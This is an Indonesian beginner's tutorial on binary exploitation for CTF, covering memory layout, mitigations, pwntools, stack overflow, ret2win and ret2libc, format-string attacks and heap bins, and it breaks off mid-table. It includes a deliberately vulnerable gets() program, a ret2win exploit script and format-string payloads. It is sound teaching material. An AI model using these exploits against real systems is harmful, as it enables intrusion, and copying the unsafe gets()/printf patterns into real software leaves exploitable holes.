# BUKU PINTAR BINARY EXPLOITATION (PWN)
## Dari Nol Hingga Mahir: Panduan Ekstensif CTF & Exploit Development

*"Memahami sistem di level terendah untuk mengendalikannya di level tertinggi."*

---

## Pendahuluan

Selamat datang di panduan komprehensif **Binary Exploitation** atau yang sering disebut sebagai **PWN** dalam dunia *Capture The Flag (CTF)*. Buku ini dirancang khusus bagi Anda yang benar-benar memulai dari nol (*zero knowledge*).

> **Apa itu PWN?**
> Kata "Pwn" berasal dari kesalahan ketik kata "Own" oleh seorang hacker/gamer di masa lalu (karena huruf P dan O bersebelahan di keyboard). Dalam keamanan siber, melakukan "pwn" berarti Anda berhasil mengambil alih kendali (*own*) atas sebuah program atau sistem yang rentan.

Buku ini ditulis tidak seperti diktat akademis yang membosankan. Kita akan menggunakan analogi kehidupan sehari-hari, ilustrasi intuitif, dan studi kasus praktis. Target kita adalah lingkungan Linux (terutama distribusi seperti Kali Linux) dengan format file **ELF (Executable and Linkable Format)**, yaitu standar file eksekusi di sistem operasi Linux.

Mari kita mulai perjalanan ini dari hal yang paling mendasar: bagaimana komputer bekerja pada level sirkuit dan memori.

---

## Bab 1: Fondasi Wajib Arsitektur Komputer

Sebelum kita bisa mengeksploitasi sebuah program, kita **wajib** memahami bagaimana komputer menjalankan program tersebut di level terendah. Jika Anda tidak memahami bagian ini, teknik eksploitasi hanya akan terasa seperti hafalan tanpa makna.

### 1.1 Terminologi Ukuran Data (Bit, Byte, Word)

Komputer tidak memahami huruf atau gambar; ia hanya memahami arus listrik yang menyala (1) atau mati (0). Inilah yang disebut **Bit**.

| Nama | Ukuran | Analogi Sehari-hari | Konteks Teknis |
| :--- | :--- | :--- | :--- |
| **Bit** | 0 atau 1 | Saklar lampu (ON/OFF). | Unit terkecil komputasi. |
| **Byte** | 8 bit | Satu loker kecil yang cukup untuk menyimpan 1 karakter huruf (misal 'A' = 65 dalam desimal). | Satuan dasar pengalamatan memori. Fungsi PWN sering beroperasi pada level byte, misal fungsi `p8()`. |
| **Word** | 2 byte (16 bit) | Dua loker yang digabung menjadi satu. | Awal sejarah prosesor 16-bit (contoh: 8086). Sering menggunakan `p16()`. |
| **DWord (Double Word)** | 4 byte (32 bit) | Empat loker. Ukuran standar "meja kerja" untuk komputer jadul atau arsitektur i386. | Ukuran register penuh pada sistem 32-bit. Fungsi manipulasi `p32()`. |
| **QWord (Quad Word)** | 8 byte (64 bit) | Delapan loker. Ukuran standar komputasi modern saat ini (arsitektur amd64/x86_64). | Ukuran alamat memori dan register pada sistem 64-bit modern. Sangat sering dipanggil lewat fungsi `p64()`. |

**Kenapa Anda harus peduli?** Saat Anda menulis exploit (disebut *payload*), Anda menginjeksi data mentah ke dalam memori. Jika sistem mengharapkan alamat 64-bit (8 byte), Anda tidak bisa sekadar mengetik teks "1234". Anda harus membungkusnya dalam format byte mentah berukuran pasti (misalnya menggunakan fungsi `p64(0x1337)` di pwntools).

### 1.2 Little Endian: Cara Aneh CPU Membaca Angka

Konsep ini sering membuat pemula kebingungan. Istilah teknis yang akan sering Anda dengar adalah **Endianness**.

> **Analogi Buku Telepon**
> Bayangkan Anda memiliki nomor telepon penting: **0812-3456-7890**. Normalnya, Anda membaca dari kiri ke kanan. Namun, bayangkan jika sistem pengarsipan Anda mengharuskan Anda menyimpan kelompok digit dari belakang ke depan, sehingga tersimpan sebagai: **7890-3456-0812**. Ketika Anda ingin menelepon, Anda harus membaliknya lagi. Itulah Endianness!

Prosesor Intel dan AMD (arsitektur x86/x64) menggunakan sistem **Little Endian**. Artinya, byte yang nilainya paling kecil (*least significant byte*) disimpan di alamat memori yang paling rendah/awal.

Contoh teknis: Mari kita lihat bagaimana angka heksadesimal `0x1122334455667788` disimpan dalam memori (alamat dari kiri ke kanan semakin besar):

```text
Alamat Memori: [0x00] [0x01] [0x02] [0x03] [0x04] [0x05] [0x06] [0x07]
Isi Memori:    [0x88] [0x77] [0x66] [0x55] [0x44] [0x33] [0x22] [0x11]
```

> ⚠️ **Kesalahan Umum Pemula**
> Banyak pemula yang berhasil mendapatkan "kebocoran memori" (*memory leak*), melihat *raw byte* `w...`, lalu kebingungan karena tidak cocok dengan alamat di debugger. Selalu ingat untuk me-*reverse* byte tersebut atau gunakan fungsi pembantu seperti `u64(data)` di pwntools untuk mengubahnya kembali menjadi format desimal/hex yang manusiawi.

### 1.3 Register: Meja Kerja CPU

RAM (Random Access Memory) itu ibarat gudang besar. Masalahnya, gudang itu jauh dan lambat. Untuk bekerja cepat, CPU memiliki "meja kerja" kecil yang ada tepat di dalam dirinya. Meja kerja ini disebut **Register**.

Di arsitektur 64-bit (amd64), ukuran setiap meja kerja ini adalah 64-bit (8 byte, atau 1 QWord). Beberapa meja memiliki fungsi umum, sementara yang lain memiliki fungsi sangat spesifik.

| Register | Nama Lengkap | Fungsi Teknis | Analogi |
| :--- | :--- | :--- | :--- |
| **RIP** | Instruction Pointer | Menunjuk ke baris alamat memori yang **sedang/akan** dieksekusi CPU. | Jarum pada pemutar piringan hitam. Ke mana jarum ini bergeser, lagu itu yang dimainkan. *Ini adalah target utama pembajakan (hijacking) kita!* |
| **RSP** | Stack Pointer | Menunjuk ke puncak tumpukan (Stack). | Ujung tongkat penanda pada tumpukan piring. |
| **RBP** | Base Pointer | Menunjuk ke dasar *stack frame* fungsi saat ini. | Batas bawah piring milik satu pelanggan tertentu. |
| **RAX** | Accumulator | Menyimpan hasil kembalian (*return value*) fungsi atau nomor Syscall. | Kotak "Hasil Akhir". Jika fungsi sukses, ia meninggalkan angka 0 di sini. |
| **RDI** | Destination Index | Argumen ke-1 untuk fungsi. | **Meja paling penting** saat kita membuat *ROP Chain* untuk menyuplai parameter pertama. |
| **RSI** | Source Index | Argumen ke-2 untuk fungsi. | Meja parameter kedua. |
| **RDX** | Data | Argumen ke-3 untuk fungsi. | Meja parameter ketiga. |

**Catatan Eksploitasi Penting:** Jika Anda bisa mengontrol nilai dari register **RIP**, Anda memiliki kemampuan mengarahkan alur eksekusi program ke mana pun yang Anda inginkan (misalnya ke fungsi yang memberikan *shell*).

### 1.4 Peta Memori Program (Memory Layout)

Ketika sebuah program dieksekusi di Linux (menjadi sebuah *Process*), OS memberikan sebuah ruang memori virtual yang rapi. Peta ini sangat vital.

```text
0x0000000000000000
+-------------------------+ 
| .text (Kode Program)    | <-- Bersifat Read & Execute. Di sinilah letak instruksi Assembly.
+-------------------------+
| .rodata (Read-Only)     | <-- Konstanta, string teks seperti "Ketik nama Anda:"
+-------------------------+
| .data                   | <-- Variabel global yang diinisialisasi (misal: int x = 5;)
+-------------------------+
| .bss                    | <-- Variabel global kosong. Sering jadi target area penyimpanan!
+-------------------------+
| HEAP (Memori Dinamis)   | <-- Memori untuk malloc()/free(). Tumbuh ke BAWAH (alamat membesar).
|        ↓                |
|                         |
|  (Ruang Memori Kosong)  |
|                         |
|        ↑                |
| STACK (Tumpukan)        | <-- Memori sementara untuk fungsi. Tumbuh ke ATAS (alamat mengecil).
+-------------------------+
| KERNEL SPACE            | <-- Dilarang akses dari area pengguna (Userland).
0xFFFFFFFFFFFFFFFF
```

**Kenapa Stack tumbuh "Terbalik" ke alamat rendah?** Ini murni sejarah desain komputasi awal. Heap dan Stack ditempatkan di ujung yang berlawanan di sisa memori dan tumbuh saling mendekati agar penggunaan ruang lebih efisien. Fakta bahwa Stack tumbuh dari alamat tinggi ke alamat rendah sangat krusial dalam eksploitasi *Buffer Overflow*!

### 1.5 Stack Frame dan Cara Kerja Fungsi

Setiap kali sebuah program memanggil sebuah fungsi (misalnya dari `main()` memanggil `vuln()`), CPU tidak boleh melupakan di mana ia berada di fungsi `main()`. Ia harus kembali setelah `vuln()` selesai.

> **Analogi Restoran Padang (Stack Frame)**
> Bayangkan setiap fungsi adalah sebuah piring yang ditumpuk. 
> 1. Fungsi `main()` adalah piring pertama di meja. Di atas piring ini ada catatan rahasia: "Kembali ke sistem operasi jika sudah selesai".
> 2. Saat `main()` memanggil fungsi `vuln()`, sebuah piring baru ditaruh di **atas** piring `main()`. Piring baru ini punya catatan: "Kalau fungsi ini selesai, kembalikan kendali ke baris X di fungsi main()".
> 3. Variabel lokal (seperti buffer teks) disimpan di atas piring `vuln()`.
> 
> Jika Anda menuangkan air (input data) terlalu banyak di piring `vuln()` hingga meluber, air tersebut akan membasahi dan merusak "catatan kembalian" (Return Address). Inilah akar dari segala kejahatan di eksploitasi stack!

Visualisasi teknis dari satu Stack Frame:
```text
(Alamat Tinggi)
+-----------------------+ 
| ... frame fungsi lain |
+-----------------------+ <-- Batas RBP fungsi sebelumnya
| Saved RBP             | <-- CPU menyimpan RBP lama di sini
+-----------------------+
| Return Address (RIP)  | <-- DI SINI TARGET UTAMA KITA! (Ke mana CPU pulang)
+-----------------------+
| Variabel Lokal /      | <-- Buffer Anda mulai di sini dan diisi ke atas (menuju alamat tinggi)
| Buffer                |
+-----------------------+ <-- RSP (Stack Pointer saat ini)
(Alamat Rendah)
```

**Hubungan Kausalitas:** Karena memori buffer berada di alamat *rendah*, dan Return Address berada di alamat *tinggi*, sedangkan penulisan data (seperti fungsi `gets()`) bergerak dari alamat rendah ke tinggi, maka data yang terlalu panjang pasti akan **menimpa (overwrite)** Return Address.

### 1.6 Calling Convention (Konvensi Pemanggilan)

Ini adalah kesepakatan internasional (standar ABI - Application Binary Interface) tentang bagaimana kompiler meletakkan parameter saat sebuah fungsi dipanggil.

**Di sistem 64-bit Linux (amd64 SysV ABI):**
Alih-alih membuang waktu menaruh argumen di memori Stack, CPU menggunakan register untuk 6 argumen pertama demi kecepatan maksimal. Urutannya wajib dihafal:
* Argumen 1: `RDI`
* Argumen 2: `RSI`
* Argumen 3: `RDX`
* Argumen 4: `RCX`
* Argumen 5: `R8`
* Argumen 6: `R9`

*Syscall* (Pemanggilan langsung ke inti Kernel OS, seperti fungsi `open`, `read`, `write`) menggunakan aturan yang sama persis, **kecuali** Argumen ke-4 menggunakan `R10`, bukan `RCX`. Sementara nomor identitas syscall (misal: 0 untuk read, 59 untuk execve) ditaruh di `RAX`.

### 1.7 Pointers: Papan Petunjuk Jalan

Banyak pemula (bahkan programmer menengah) masih bingung dengan *Pointers*. Di bahasa C, pointer adalah ruh segalanya.

> **Analogi Kompleks Perumahan**
> Bayangkan memori sebagai kompleks perumahan yang membentang sangat luas. 
> * Setiap rumah (variabel) memiliki nilai di dalamnya (misalnya 10 orang penghuni).
> * Setiap rumah pasti memiliki **Nomor Rumah** (Alamat Memori).
> * **Pointer** adalah sebuah *papan petunjuk jalan* yang bertuliskan "Rumah Bapak Budi ada di Jalan Mawar Blok B No. 4000". Pointer tidak menyimpan orangnya, melainkan menyimpan "Jalan Mawar Blok B No. 4000"-nya.

Di dunia exploitasi, kita tidak puas hanya dengan mengganti penghuni rumah. Kita ingin mengganti **papan petunjuk jalannya** sehingga program secara tidak sengaja menuju ke "rumah" berisi kode berbahaya buatan kita.

---

## Bab 2: Pola Pikir dan Tembok Pertahanan (Mitigasi)

### 2.1 Mindset Detektif dalam PWN

Bermain PWN dalam konteks kompetisi keamanan (CTF) atau penelitian dunia nyata membutuhkan pola pikir seperti seorang detektif koroner forensik.

Anda diberikan sebuah *binary file* (program kompilasi). Seringkali program ini *crash* (mati mendadak) saat diberi input tertentu. Tugas Anda bukan sekadar membuatnya *crash*, tapi mengarahkannya secara presisi. Berikut adalah 5 pertanyaan emas yang **selalu** harus Anda jawab:

1. **Bug Class apa yang eksis?** Apakah ini Buffer Overflow di Stack? Atau kesalahan Format String di fungsi `printf`? Atau Use-After-Free di Heap?
2. **Primitive apa yang saya miliki?** *Primitive* adalah satuan kekuatan dasar. Apakah Anda punya kemampuan "Membaca memori secara acak" (*Arbitrary Read*)? Atau "Menulis satu byte memori di mana saja" (*Arbitrary Write*)?
3. **Mitigasi apa yang aktif?** Apakah ada penjaga keamanan?
4. **Kebocoran (Leak) informasi apa yang wajib didapat?** Anda tidak merampok bank dengan mata tertutup. Anda butuh denah (Memory Leak).
5. **Rantai (Chain) serangan apa yang paling murah/mudah?** Jangan memaksakan teknik rumit jika teknik sederhana bisa mendapatkan *Shell*.

### 2.2 Tembok Mitigasi Komputer Modern

Di era 1990-an, meng-hack komputer sangat mudah. Tidak ada pertahanan. Anda lempar kode jahat ke tumpukan memori, arahkan program ke sana, boom! *Hacked*. Untuk melawan ini, para insinyur menciptakan mitigasi (sistem pertahanan).

Anda bisa memeriksa mitigasi ini di terminal Kali Linux menggunakan perintah `checksec`.

```bash
┌──(aberama㉿kali)-[~/ctf/pwn]
$ checksec --file=./vuln_binary
[*] '/home/aberama/ctf/pwn/vuln_binary'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

#### 1. NX (No-eXecute) / DEP (Data Execution Prevention)
* **Konteks Historis:** Dulu, peretas menulis baris instruksi jahat langsung di buffer teks (Stack), lalu program diarahkan untuk menjalankannya. 
* **Analogi:** Anda diizinkan menyimpan barang di gudang (Stack), tapi Anda dilarang mengadakan pesta/konser (menjalankan kode) di gudang tersebut. Konser hanya boleh diadakan di ruang tamu (segmen `.text`).
* **Efek Eksploitasi:** Jika NX Enabled, Anda tidak bisa sekadar menyuntikkan *Shellcode* mentah. Anda harus meminjam blok kode sah yang sudah ada di memori program (Teknik ini disebut ROP - Return Oriented Programming).

#### 2. ASLR (Address Space Layout Randomization) & PIE (Position Independent Executable)
* **Analogi:** Jika PIE dinonaktifkan (No PIE), program Anda bagaikan rumah dengan alamat permanen. Anda tahu pasti di mana letak brankas (fungsi kunci). Jika PIE dan ASLR aktif, rumah tersebut dibongkar dan dipindah ke koordinat acak setiap kali Anda berkedip! Anda tidak bisa menghafal alamat.
* **Efek Eksploitasi:** Anda diwajibkan mencari "kebocoran memori" (*Leak*) terlebih dahulu. Jika Anda tahu di mana letak pintu depan saat ini, Anda bisa menghitung jarak (*offset*) ke brankas, karena struktur internal rumah tetap sama, hanya lokasinya di peta yang berpindah.

#### 3. Stack Canary
* **Konteks Historis:** Dinamai dari "Canary in a coal mine" (burung kenari yang dibawa penambang batu bara untuk mendeteksi gas beracun).
* **Analogi:** Sebelum menutup pintu gudang (return dari fungsi), satpam akan menempelkan segel hologram (Canary) tepat di bawah dokumen penting (Return Address). Saat fungsi selesai, satpam memeriksa segelnya. Jika segelnya rusak (karena air tumpahan dari buffer overflow Anda), alarm berbunyi (`*** stack smashing detected ***`) dan program membunuh dirinya sendiri.
* **Efek Eksploitasi:** Anda tidak bisa sekadar menabrak (overflow) secara membabi buta. Anda harus membocorkan (*leak*) nilai Canary (segel) tersebut, dan meletakkan segel yang sama persis saat melakukan overflow agar satpam terkecoh.

#### 4. RELRO (Relocation Read-Only)
Ini berkaitan erat dengan tabel GOT (Global Offset Table) yang akan kita bahas mendalam di Bab 4.
* **Partial RELRO:** Tabel GOT masih bisa diedit. Ini adalah target favorit eksploitasi, ibarat buku telepon yang bisa Anda ganti angkanya sesuka hati.
* **Full RELRO:** Tabel GOT dikunci setelah program memuat semua modul. Anda tidak bisa lagi menulis ke sana. Cari target fungsi lain.

---

## Bab 3: Persenjataan dan Lingkungan Kerja (Tooling)

### 3.1 Swiss Army Knife: Pwntools

`pwntools` adalah kerangka kerja (*framework*) Python yang dikembangkan khusus untuk menyusun eksploitasi dengan cepat. Tanpa alat ini, interaksi jaringan dan pemrosesan bit akan sangat menyiksa.

Berikut adalah *Skeleton* (Kerangka dasar) wajib yang harus Anda pahami baris demi baris:

```python
#!/usr/bin/env python3
from pwn import *

# 1. Inisialisasi Environment
# Secara otomatis mengenali arsitektur (32/64 bit), OS, dan Endianness.
exe = context.binary = ELF('./chall', checksec=False)

# (Opsional) Jika challenge menyediakan file library 'libc'
# libc = ELF('./libc.so.6', checksec=False) 

# Mengatur agar log menampilkan informasi detail dan GDB terbuka di pane tmux sebelah
context.log_level = 'info'
context.terminal = ['tmux', 'splitw', '-h']

HOST = '10.10.10.10'
PORT = 1337

def start():
    # Fungsi ajaib yang memungkinan kita gonta-ganti mode eksekusi tanpa mengubah kodingan
    if args.REMOTE:
        return remote(HOST, PORT)      # Koneksi ke server asli
    if args.GDB:
        # Menjalankan program di lokal sambil ditempel debugger
        return gdb.debug([exe.path], gdbscript='''
            b *main
            continue
        ''')
    return process([exe.path])         # Eksekusi normal di lokal

io = start()

# ==== BAGIAN INJEKSI EKSPLOITASI ===
# (Kita akan menulis payload di sini)

io.sendline(b"Data Payload Kita")

# ===================================

# Mengembalikan kendali terminal kepada kita untuk mengetik perintah shell
io.interactive()
```

> 💡 **Tips Profesional**
> Simpan kerangka kode di atas di komputer Anda sebagai `template.py`. Saat Anda memulai tantangan CTF baru, Anda cukup menyalin file tersebut. Eksekusi program dengan mengetik `python3 solve.py GDB` untuk debugging, dan `python3 solve.py REMOTE` untuk menyerang server nyata.

### 3.2 Debugger: GDB dan Pwndbg / GEF

GDB (GNU Debugger) standar bawaan Linux sangat kering dan jelek. Komunitas keamanan menambahkan *plugin* seperti **pwndbg** atau **GEF** untuk memberikan antarmuka visual yang menakjubkan yang menampilkan Register, Disassembly (Kode mesin), dan Stack sekaligus.

**Perintah GDB Penting untuk Survival:**
* `b *main` : Memasang *Breakpoint* (rem darurat) tepat saat fungsi `main` dimulai.
* `r` : Run. Menjalankan program.
* `ni` (Next Instruction) : Menjalankan satu baris instruksi ke depan (tanpa masuk ke dalam sub-fungsi).
* `si` (Step Instruction) : Maju satu instruksi dan akan menyelam *ke dalam* fungsi jika ada pemanggilan.
* `x/20gx $rsp` : (Examine Memory) Periksa (`x`) 20 blok (`20`) dalam format giant-word 8-byte (`g`) dan tampilkan sebagai heksadesimal (`x`) dimulai dari alamat yang ditunjuk oleh Stack Pointer (`$rsp`). Ini sangat sering dipakai!
* `vmmap` : Menampilkan peta pembagian segmen memori (sangat berguna untuk melihat apakah segmen Stack bisa dieksekusi atau tidak).

---

## Bab 4: Membajak Alur (Stack Exploitation) & Rahasia PLT/GOT

Sebelum kita menyerang memori, ada satu konsep sistem operasi Linux yang harus Anda kuasai secara mendalam. Jika Anda tidak memahami ini, teknik *Return-to-Libc (ret2libc)* tidak akan masuk akal.

### 4.1 PLT dan GOT: Analogi Restoran Cepat Saji

Sebuah program C yang ringan (misalnya hanya memanggil `printf("Halo")`) tidak memasukkan seluruh kode internal `printf` ke dalam dirinya. Jika begitu, ukuran program akan membengkak hingga puluhan Megabyte. Sebagai gantinya, Linux menggunakan konsep **Dynamic Linking** (Pemuatan Dinamis).

Program utama menggunakan pustaka eksternal raksasa bernama **libc** yang ada di dalam sistem operasi. Bagaimana program tahu di mana letak fungsi `printf` di dalam memori *libc*? Ia menggunakan mekanisme **PLT (Procedure Linkage Table)** dan **GOT (Global Offset Table)**.

> **Analogi Ekstensif: Pelayan dan Koki Dapur**
> Bayangkan Program Anda adalah sebuah restoran.
> * **PLT (Menu Makanan):** Daftar singkat fungsi yang Anda gunakan. PLT adalah sekelompok kecil instruksi pelompat (*stub*).
> * **GOT (Papan Catatan Nomor Meja):** Tabel memori yang dirancang untuk menyimpan alamat asli dari dapur.
> * **Libc (Dapur Pusat):** Tempat di mana `printf`, `system`, dan fungsi lain benar-benar dieksekusi.
> * **Dynamic Linker (Pelayan Lari):** Program khusus di OS (`ld-linux`) yang tugasnya berlari ke dapur mencari posisi koki.
> 
> **Skenario Pemanggilan Pertama (Lazy Binding):**
> Program memanggil `printf` dari menu (PLT). Papan catatan (GOT) ternyata masih kosong. Karena kosong, ia memanggil Pelayan (Linker) untuk berlari ke dapur mencari posisi `printf`. Pelayan menemukannya, mencatat alamat aslinya di Papan (GOT), lalu mengeksekusi `printf`. Langkah awal ini agak lambat.
> 
> **Skenario Pemanggilan Kedua:**
> Program memanggil `printf` lagi. Ia melihat Papan (GOT). Wah, alamatnya sudah dicatat! Program langsung melompat ke dapur (libc) tanpa bantuan pelayan. Super cepat!

**Hubungannya dengan Eksploitasi:**
1. **Membocorkan Alamat (Leak):** Karena tabel GOT berisi alamat asli memori `libc`, jika kita bisa mencetak (print) isi dari alamat GOT, kita akan tahu alamat dasar memori `libc`. Ini wajib dilakukan untuk membypass pertahanan ASLR.
2. **GOT Overwrite:** Jika kita bisa mengubah tabel GOT (pada sistem dengan *Partial RELRO*), kita bisa menghapus catatan alamat `printf` dan menggantinya dengan alamat fungsi berbahaya seperti `system("/bin/sh")`. Saat program secara polos mencoba memanggil `printf("Halo")`, ia justru mengeksekusi `system("Halo")`.

### 4.2 Buffer Overflow: Menumpahkan Gelas

Lihat contoh kode C yang rentan (vulnerable) berikut:

```c
#include <stdio.h>

void vuln() {
    char buffer[32];      // Wadah yang didesain hanya muat 32 karakter
    
    puts("Masukkan nama Anda:");
    gets(buffer);         // FUNGSI SANGAT BERBAHAYA! Tidak ada batas bacaan.
    
    printf("Halo, %s\n", buffer);
}

int main() {
    vuln();
    return 0;
}
```

Fungsi `gets()` akan terus membaca ketikan dari user sampai user menekan Enter. Jika Anda memasukkan 50 karakter 'A', 32 karakter akan masuk ke dalam `buffer`, lalu 18 karakter sisanya akan tumpah melampaui batas dan membasahi area memori kritis di bawahnya, yaitu **Saved RBP** dan yang paling krusial: **Return Address (RIP)**.

**Cara Menemukan Jarak Tabrakan (Offset):**
Kita tidak menebak-nebak. Kita menggunakan fungsi **Cyclic Pattern** dari pwntools (pola berurutan seperti `aaaabaaacaaadaaa...`). Saat program crash, kita melihat di debugger bahwa RIP tertimpa oleh string misalnya `"caaa"`. Pwntools akan mencarikan di posisi byte ke berapakah `"caaa"` berada.

```bash
┌──(aberama㉿kali)-[~/ctf/pwn]
$ pwn cyclic 100
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
# ... setelah disisipkan ke program dan program crash di alamat 0x6161616a (jaaa)
$ pwn cyclic -l 0x6161616a
36
```

Artinya, jaraknya adalah 36 byte! Data setelah byte ke-36 akan tepat jatuh di atas **Return Address**.

### 4.3 Serangan Tahap 1: Ret2Win (Kembali untuk Menang)

Ini adalah skenario paling mudah. Tantangan CTF sengaja menyediakan fungsi `win()` (contohnya sebuah blok kode yang membuka file `flag.txt`), tapi fungsi itu tidak pernah dipanggil secara normal. Perlindungan **NX** dan **PIE** mati.

**Logika Serangan:** Kita mengisi buffer sebanyak 36 byte sampah, dan langsung meletakkan alamat fungsi `win()` di kotak Return Address.

```python
from pwn import *
exe = ELF('./vuln')
io = process(exe.path)

offset = 36
alamat_win = exe.symbols['win']  # Pwntools otomatis mencari alamat fungsi win

# Struktur payload: 36 byte huruf 'A' (b'A'*36) + Alamat win dibungkus format 64-bit
payload = b'A' * offset + p64(alamat_win)

io.sendline(payload)
io.interactive()
```

### 4.4 Serangan Tahap 2: ROP (Return Oriented Programming) & Ret2Libc

Bagaimana jika fungsi `win()` tidak ada, dan perlindungan **NX** (No-Execute) aktif? Anda tidak bisa menginjeksi *shellcode* (instruksi mentah) ke stack karena OS melarang eksekusi di sana.

**Senjata Anda: ROP (Return Oriented Programming)**.
Karena Anda tidak bisa membawa pedang sendiri, Anda merangkai pecahan-pecahan kaca (potongan instruksi) yang berserakan di dalam program itu sendiri. Pecahan instruksi kecil ini disebut **Gadget**. Syarat utamanya: setiap gadget *harus* diakhiri dengan instruksi `ret` (return), agar kontrol aliran program melompat ke alamat yang ada di urutan tumpukan memori berikutnya.

**Konsep Ret2Libc (Return to Libc):**
Kita merangkai gadget sedemikian rupa agar parameter (argumen) diatur dengan benar, lalu melompat ke fungsi `system("/bin/sh")` yang bersarang dengan damai di dalam pustaka eksternal `libc`. Dengan begitu, kita mendapatkan akses terminal penuh (shell).

Karena `libc` dilindungi ASLR (alamatnya diacak), eksploitasi ret2libc modern membutuhkan dua tahap kirim (*2 stages payload*):
1. **Tahap 1: Pembocoran (Leak).** Kita merangkai ROP Chain untuk memanggil fungsi cetak seperti `puts(alamat_GOT_puts)` untuk mencetak alamat `libc` ke layar terminal. Kemudian program diinstruksikan untuk memanggil ulang fungsi `main()` agar tidak mati.
2. **Tahap 2: Hitungan Matematika.** Kita menangkap output yang dicetak, menghitung *offset* tetap (Jarak statis antara alamat `puts` dan alamat `system`), menemukan alamat dasar libc yang sebenarnya.
3. **Tahap 3: Pukulan Mematikan.** Kita mengirim Buffer Overflow kedua, kali ini meletakkan nilai parameter `"/bin/sh"` (didapat dari dalam libc) ke register **RDI** (ingat tabel Calling Convention!), lalu melompat ke fungsi `system`.

> ⚠️ **Kesalahan Fatal: Stack Alignment 16-Byte di amd64**
> Pada arsitektur 64-bit modern, OS Ubuntu (glibc) memiliki aturan yang sangat ketat: setiap kali memanggil sebuah fungsi (seperti `system`), posisi tumpukan memori (RSP) harus berkelipatan 16 (16-byte aligned). Jika tidak? Program akan crash secara konyol di instruksi aneh bernama `movaps`. 
> 
> **Solusinya:** Tambahkan 1 gadget `ret` ekstra yang tidak melakukan apa-apa ke dalam rantai payload Anda tepat sebelum memanggil fungsi tersebut. Ini berfungsi sebagai pengganjal untuk menggeser memori sebesar 8 byte, sehingga total selaras menjadi 16 byte.

---

## Bab 5: Manipulasi Format String (Senjata Tak Kasat Mata)

Bug *Format String* tidak mempedulikan *Buffer Overflow* atau ukuran buffer. Bug ini mengandalkan keteledoran murni programmer yang malas.

**Penyebab Bug:**
```c
// KODE BENAR DAN AMAN
printf("%s", input_user); 

// KODE MALAS DAN BERBAHAYA
printf(input_user); 
```

**Kenapa ini berbahaya?** Fungsi `printf` mendeteksi kode khusus bernama format specifier seperti `%d` (angka), `%s` (teks), `%x` (hex). Jika fungsi melihat `%x`, ia akan berasumsi bahwa pemrogram *telah meletakkan argumen di memori stack*, dan ia akan mulai membaca isi memori internal secara berurutan dan mencetaknya ke layar!

### 5.1 Kemampuan 1: Arbitrary Read (Membaca Isi Memori)

Sebagai peretas, Anda bisa menginputkan teks seperti ini: `%p.%p.%p.%p.%p` (`%p` adalah penanda format pointer memori panjang). Hasil di layar bukan `%p`, melainkan sesuatu seperti ini:
`0x7ffd1122.0x8048123.0x0.0x41414141`

Anda baru saja membaca isi rahasia dari tumpukan memori! Anda bisa membocorkan nilai rahasia Canary, alamat dasar PIE (untuk membypass pengacakan), dan alamat Libc, hanya dari satu kelemahan ini.

**Sintaks Parameter Langsung:** Jika Anda tidak ingin mengetik `%p` berulang kali dan hanya ingin membaca memori pada indeks ke-7 di tumpukan, Anda bisa mengirim: `%7$p`.

### 5.2 Kemampuan 2: Arbitrary Write (Menulis Menggunakan Fungsi Cetak?!)

Ini adalah hal yang paling tidak masuk akal dalam bahasa pemrograman C. `printf` memiliki specifier khusus bernama `%n`. 

Alih-alih membaca, `%n` akan **menulis jumlah karakter yang telah dicetak ke layar**, ke dalam alamat memori yang ia tunjuk. Ya, Anda bisa menulis data menggunakan perintah cetak!

> **Cara Kerja Mekanika %n**
> Jika Anda mencetak "Hello", itu adalah 5 karakter. Jika format selanjutnya adalah `%n` menunjuk ke variabel `A`, maka variabel `A` akan diubah nilainya menjadi angka 5.
> Jika Anda ingin menulis angka besar (misalnya alamat memori `0x08041234` = desimal 134484532), Anda tidak perlu mengetik "Hello" 134 juta kali. Cukup manipulasi padding cetak: `%134484532c%n`. (Artinya: cetak 1 spasi dengan lebar 134 juta karakter, lalu tulis jumlahnya ke alamat memori).

Karena menulis ratusan juta byte secara langsung ke layar akan membuat komputer hang/crash, peretas membagi penulisan memori besar menjadi beberapa penulisan ukuran kecil per satu *byte* menggunakan modifier `%hhn`.

Pwntools menyediakan otomatisasi brilian untuk ini, jadi Anda tidak perlu menghitung secara manual, yaitu melalui fungsi `fmtstr_payload(offset, {alamat_target: nilai_baru})`.

---

## Bab 6: Rimba Gelap Memori Dinamis (Heap Exploitation)

Jika eksploitasi Stack (Buffer Overflow) adalah permainan membobol pagar rumah dengan mendobrak lurus, eksploitasi Heap adalah seni memanipulasi administrasi pembukuan pergudangan logistik raksasa yang sangat kompleks.

*Heap* adalah memori dinamis. Saat programmer membutuhkan memori tambahan di tengah jalan yang ukurannya tidak menentu, ia memanggil fungsi `malloc()` (Memory Allocate) dan setelah selesai, mengembalikannya ke sistem operasi menggunakan `free()`.

### 6.1 Anatomi Chunk dan Bin

Glibc (Pengelola memori utama di Linux) tidak pernah memberikan blok memori mentah ke pengguna. Ia membungkusnya dalam entitas bernama **Chunk**. Sebuah Chunk berisi *Metadata* (Catatan pembukuan internal sebesar 16 byte seperti informasi ukuran chunk) dan *User Data* (Ruang untuk isi variabel).

Ketika chunk tidak lagi digunakan (di-`free`), ia tidak langsung dikembalikan ke RAM fisik. Glibc menyimpannya dalam daftar antrean internal yang disebut **Bins**, dengan harapan jika program membutuhkan ukuran yang sama dalam waktu dekat, glibc bisa langsung mengeluarkannya tanpa repot berinteraksi dengan kernel.

Macam-macam "tong sampah daur ulang" (Bins):
* **Tcache (Thread Local Cache):** Sistem keranjang khusus yang ada pada glibc modern (mulai versi 2.26). Ini menampung bongkahan ukuran kecil dan menempatkannya dalam struktur linked-list paling sederhana dan (awalnya) tanpa pengecekan keamanan sama sekali. Target terlezat bagi peretas.
* **Fastbins:** Mirip Tcache tapi merupakan warisan glibc lama.
* **Unsorted Bin:** Ruang transit sementara untuk chunk berukuran agak besar (biasanya di atas 0x400 byte). Yang menarik dari Unsorted bin adalah, pointer internalnya terhubung langsung ke inti glibc (struktur `main_arena`). Membocorkan (leak) isi dari chunk di dalam unsorted bin = Membocorkan alamat base `libc`.

### 6.2 Kelas Kerentanan Mayor di Heap

Berikut adalah kerentanan operasional administratif (Heap Bugs) yang paling merusak:

| Nama Bug | Penjelasan dan Analogi | Dampak Eksploitasi |
| :--- | :--- | :--- |
